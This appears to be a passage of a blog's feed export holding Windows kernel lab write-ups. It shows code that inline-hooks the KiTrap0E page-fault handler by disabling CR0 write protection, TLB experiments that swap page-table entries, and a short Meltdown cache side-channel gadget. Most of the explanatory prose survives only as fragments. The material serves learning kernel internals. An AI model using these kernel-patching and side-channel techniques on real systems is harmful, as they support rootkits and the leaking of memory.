class="comment">//</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;.mycode&quot;</span>) __declspec(allocate(<span class="string">&quot;.mycode&quot;</span>)) int main();</span></span><br><span class="line"><span class="comment">//0x412000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        jmp L</span><br><span class="line">        ret <span class="comment">//0412004</span></span><br><span class="line">    L:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i++);</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fake</p><p><img src="/2023/06/04/Windows-Kernel-Experiment-ShadowWalker/image-20230604120326540.png" alt="image-20230604120326540"></p><p>main</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-Page-Fault/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-"><a href="#Windows-" class="headerlink" title="Windows:"></a>Windows:</h1><p>inlinehook0e_KiTrap0E,</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603210651048.png" alt="image-20230603210651048"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:80541450                               _KiTrap0E proc near</span><br><span class="line">.text:80541450 66 C7 44 24 02 00 00          mov     word ptr [esp+2], 0</span><br><span class="line">.text:80541457 55                            push    ebp</span><br><span class="line">.text:80541458 53                            push    ebx</span><br><span class="line">.text:80541459 56                            push    esi</span><br><span class="line">.text:8054145A 57                            push    edi</span><br><span class="line">.text:8054145B 0F A0                         push    fs</span><br><span class="line">.text:8054145D BB 30 00 00 00                mov     ebx, 30h ; &#x27;0&#x27;</span><br><span class="line">.text:80541462 66 8E E3                      mov     fs, bx</span><br><span class="line">.text:80541465                               assume fs:nothing</span><br><span class="line">.text:80541465 64 8B 1D 00 00 00 00          mov     ebx, large fs:0</span><br><span class="line">.text:8054146C 53                            push    ebx</span><br><span class="line">.text:8054146D 83 EC 04                      sub     esp, 4</span><br><span class="line">.text:80541470 50                            push    eax</span><br></pre></td></tr></table></figure><p><strong>inlinehook.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//gdtr</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_ERRNO 0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_EIP 0x8003f254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR2 0x8003f25c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">JmpTarget</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span>* p = (<span class="type">char</span>*)<span class="number">0x8003f130</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">//size_t i=0;edi</span></span><br><span class="line">        *p = ((<span class="type">char</span>*)JmpTarget)[i];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        and eax, not <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        <span class="comment">//_KiTrap0E hook</span></span><br><span class="line">        <span class="comment">//push 0x8003f130  68 30 F1 03 80</span></span><br><span class="line">        <span class="comment">//ret  C3</span></span><br><span class="line">        mov al,<span class="number">0x68</span></span><br><span class="line">        mov ds:[<span class="number">0x80541450</span>],al</span><br><span class="line">        mov dword ptr ds:[<span class="number">0x80541451</span>],<span class="number">0x8003f130</span></span><br><span class="line">        mov al,<span class="number">0xc3</span></span><br><span class="line">        mov ds:[<span class="number">0x80541455</span>],al</span><br><span class="line"></span><br><span class="line">        mov eax,<span class="number">0xffffffff</span></span><br><span class="line">        mov ds:[T_CR3],eax</span><br><span class="line">        xor eax,eax</span><br><span class="line">        mov ds:[T_ERRNO],eax</span><br><span class="line">        mov ds:[T_CR2],eax</span><br><span class="line">        mov ds:[T_EIP],eax</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        or eax, <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push eax</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        cmp eax,ds:[T_CR3]</span><br><span class="line">        jnz end</span><br><span class="line">        <span class="comment">//pusheax4</span></span><br><span class="line">        mov eax,ss:[esp+<span class="number">4</span>]</span><br><span class="line">        mov ds:[T_ERRNO],eax</span><br><span class="line">        mov eax,ss:[esp+<span class="number">8</span>]</span><br><span class="line">        mov ds:[T_EIP],eax</span><br><span class="line">        <span class="comment">//cr2</span></span><br><span class="line">        mov eax,cr2</span><br><span class="line">        mov ds:[T_CR2],eax</span><br><span class="line">  end:<span class="comment">//_KiTrap0E</span></span><br><span class="line">        pop eax</span><br><span class="line">        mov word ptr[esp + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">        push <span class="number">0x80541457</span></span><br><span class="line">        ret </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603233450894.png" alt="image-20230603233450894"></p><p>cr2</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603233002202.png" alt="image-20230603233002202"></p><p><strong>test.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//gdtr</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_ERRNO 0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_EIP 0x8003f254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR2 0x8003f25c</span></span><br><span class="line">DWORD g_errno,g_eip,g_cr2;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov ds:[T_CR3],eax<span class="comment">//inlinhookKiTrap0E,jnz end</span></span><br><span class="line">        mov eax,ds:[T_EIP]</span><br><span class="line">        mov g_eip,eax</span><br><span class="line">        mov eax,ds:[T_CR2]</span><br><span class="line">        mov g_cr2,eax</span><br><span class="line">        mov eax,ds:[T_ERRNO]</span><br><span class="line">        mov g_errno,eax</span><br><span class="line">        xor eax,eax</span><br><span class="line">        mov ds:[T_EIP],eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        interrupt();</span><br><span class="line">        <span class="keyword">if</span>(g_eip)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;eip:0x%x errno:0x%x cr2:0x%x\n&quot;</span>,g_eip,g_errno,g_cr2);</span><br><span class="line">        Sleep(<span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>text.execr3</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 80541450</span></span><br><span class="line">ReadVirtual: 80541450 not properly sign extended</span><br><span class="line">80541450 6830f10380      push    8003F130h</span><br><span class="line">80541455 c3              ret</span><br><span class="line">80541456 005553          add     byte ptr [ebp+53h],dl</span><br><span class="line">80541459 56              push    esi</span><br><span class="line">8054145a 57              push    edi</span><br><span class="line">8054145b 0fa0            push    fs</span><br><span class="line">8054145d bb30000000      mov     ebx,30h</span><br><span class="line">80541462 668ee3          mov     fs,bx</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 8003F130 l20</span></span><br><span class="line">ReadVirtual: 8003f130 not properly sign extended</span><br><span class="line">8003f130 50              push    eax</span><br><span class="line">8003f131 0f20d8          mov     eax,cr3</span><br><span class="line">8003f134 3e3b0558f20380  cmp     eax,dword ptr ds:[8003F258h]</span><br><span class="line">8003f13b 751f            jne     8003f15c</span><br><span class="line">8003f13d 368b442404      mov     eax,dword ptr ss:[esp+4]</span><br><span class="line">8003f142 3ea350f20380    mov     dword ptr ds:[8003F250h],eax</span><br><span class="line">8003f148 368b442408      mov     eax,dword ptr ss:[esp+8]</span><br><span class="line">8003f14d 3ea354f20380    mov     dword ptr ds:[8003F254h],eax</span><br><span class="line">8003f153 0f20d0          mov     eax,cr2</span><br><span class="line">8003f156 3ea35cf20380    mov     dword ptr ds:[8003F25Ch],eax</span><br><span class="line">8003f15c 58              pop     eax</span><br><span class="line">8003f15d 66c74424020000  mov     word ptr [esp+2],0</span><br><span class="line">8003f164 6857145480      push    offset nt!KiTrap0E+0x7 (80541457)</span><br></pre></td></tr></table></figure><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603224451243.png" alt="image-20230603224451243"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:TLB(ITLB)&amp;&amp;Meltdown CPU</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-ITLB-Pipeline/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-ITLB-Pipeline/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-TLB-ITLB--amp-amp-Meltdown-CPU"><a href="#Windows-TLB-ITLB--amp-amp-Meltdown-CPU" class="headerlink" title="Windows:TLB(ITLB)&amp;&amp;Meltdown CPU"></a>Windows:TLB(ITLB)&amp;&amp;Meltdown CPU</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;<span class="comment">//0041A1D0</span></span><br><span class="line">DWORD64 g_pte;<span class="comment">//0x0041A1C8</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    <span class="comment">//__asm int 3</span></span><br><span class="line">    g_pte = *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    __asm mov eax, ds: [<span class="number">0x0041c000</span>]<span class="comment">//page2tlb</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov cr3,eax</span><br><span class="line">    &#125;<span class="comment">//tlb</span></span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>);<span class="comment">//tlb misss</span></span><br><span class="line">    <span class="comment">//g_var = page2[0];</span></span><br><span class="line">    _asm &#123;</span><br><span class="line">        mov eax,ds:[<span class="number">0x0041c000</span>]</span><br><span class="line">        mov g_var,eax</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov cr3, eax</span><br><span class="line">    &#125;<span class="comment">//tlb</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">0xc3</span>;<span class="comment">//ret</span></span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">0xc390</span>;<span class="comment">//nop ret tlb</span></span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))page1)();</span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))page2)();</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">        interrupt();</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0xc3</span> != g_var)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;g_var:%x\n&quot;</span>, g_var);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new_pageIdtEntry</p><p></p><p>section pagepage1page2</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !pte <span class="number">0x0041b000</span></span><br><span class="line">                    VA <span class="number">0041b</span>000</span><br><span class="line">PDE at C0600010            PTE at C00020D8</span><br><span class="line">contains <span class="number">000000000295</span>C067  contains <span class="number">0000000002903067</span></span><br><span class="line">pfn <span class="number">295</span>c      ---DA--UWEV  pfn <span class="number">2903</span>      ---DA--UWEV</span><br><span class="line"></span><br><span class="line">kd&gt; !pte <span class="number">0x0041c000</span></span><br><span class="line">                    VA <span class="number">0041</span>c000</span><br><span class="line">PDE at C0600010            PTE at C00020E0</span><br><span class="line">contains <span class="number">000000000295</span>C067  contains <span class="number">000000000</span>A024067</span><br><span class="line">pfn <span class="number">295</span>c      ---DA--UWEV  pfn a024      ---DA--UWEV</span><br></pre></td></tr></table></figure><blockquote><p>#pragma section(new_page,read,writeexecute)</p><p>xp</p></blockquote><p>page1 2IdtEntrypage1 2page1 2tlb</p><h2 id="Meltdown-CPU"><a href="#Meltdown-CPU" class="headerlink" title="Meltdown CPU"></a>Meltdown CPU</h2><p>jyycpu</p><p><strong></strong>cpu</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// %rcx: %rbx: </span></span><br><span class="line">        xorq   %rax, %rax</span><br><span class="line">retry:  movzbq (%rcx), %rax   <span class="comment">// Page Fault</span></span><br><span class="line">        shlq   $<span class="number">0xc</span>, %rax</span><br><span class="line">        jz     retry</span><br><span class="line">        <span class="title function_">movq</span>   <span class="params">(%rbx, %rax)</span>, %rbx <span class="comment">// (%rbx + (%rax) * 4096)</span></span><br></pre></td></tr></table></figure><ol><li>cpumovzbq (%rcx), %rax</li><li>rax1.</li><li></li><li>movq   (%rbx, %rax), %rbx rcx1bytecache</li><li>rbx (cache hitcache miss)</li></ol><p>cache</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:TLB(DTLB)</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-DTLB/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-DTLB/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-TLB-DTLB"><a href="#Windows-TLB-DTLB" class="headerlink" title="Windows:TLB(DTLB)"></a>Windows:TLB(DTLB)</h1><p>TLBTranslation Lookaside Buffer()TLBtlbtlb</p><p>tlb</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;</span><br><span class="line">DWORD64 g_pte;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,ds:[<span class="number">0x0041c000</span>]<span class="comment">//page2tlb</span></span><br><span class="line">    &#125;</span><br><span class="line">    g_pte= *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>);</span><br><span class="line">    g_var = page2[<span class="number">0</span>];</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;<span class="comment">//double free </span></span><br><span class="line">    __asm&#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">2</span>;<span class="comment">//tlb</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%d\n&quot;</span>,g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_var:<span class="number">2</span></span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><p>tlbpage2page1g_var &#x3D; page2[0];page1g_var,1</p><p>tlbtlbpage2tlb2</p><p>page2page1double free</p><h2 id="tlb"><a href="#tlb" class="headerlink" title="tlb"></a>tlb</h2><p>TLB(<strong>tlb</strong>)</p><ol><li>TLB</li><li>MMUTLB</li><li>TLBinvlpg addr(Invalidate Page)g(global)TLBtlb</li></ol><p>cr3TLB</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;</span><br><span class="line">DWORD64 g_pte;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, ds: [<span class="number">0x0041c000</span>]<span class="comment">//page2tlb</span></span><br><span class="line">    &#125;</span><br><span class="line">    g_pte = *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>);</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov cr3,eax<span class="comment">//TLB</span></span><br><span class="line">    &#125;</span><br><span class="line">    g_var = page2[<span class="number">0</span>];</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;<span class="comment">//double free </span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">2</span>;<span class="comment">//tlb</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%d\n&quot;</span>, g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_var:<span class="number">1</span></span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><h2 id="G"><a href="#G" class="headerlink" title="G"></a>G</h2><p>8G(gloabal)</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-DTLB/image-20230603122904700.png" alt="image-20230603122904700"></p><p>tlbGtlb((invlpg)Gtlb</p><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 8137ada0  SessionId: 0  Cid: 0430    Peb: 7ffdb000  ParentCid: 04f0</span><br><span class="line">    DirBase: 090c0360  ObjectTable: e24d1a98  HandleCount:  15.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 8137ada0</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">80528bdc cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 0x0041b000</span></span><br><span class="line">                    VA 0041b000</span><br><span class="line">PDE at C0600010            PTE at C00020D8</span><br><span class="line">contains 000000000FE30067  contains 8000000000938067</span><br><span class="line">pfn fe30      ---DA--UWEV  pfn 938       ---DA--UW-V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte gdtr</span></span><br><span class="line">                    VA 8003f000</span><br><span class="line">PDE at C0602000            PTE at C04001F8</span><br><span class="line">contains 0000000000B0A163  contains 000000000003F163</span><br><span class="line">pfn b0a       -G-DA--KWEV  pfn 3f        -G-DA--KWEV</span><br></pre></td></tr></table></figure><p>gdtrG3</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) 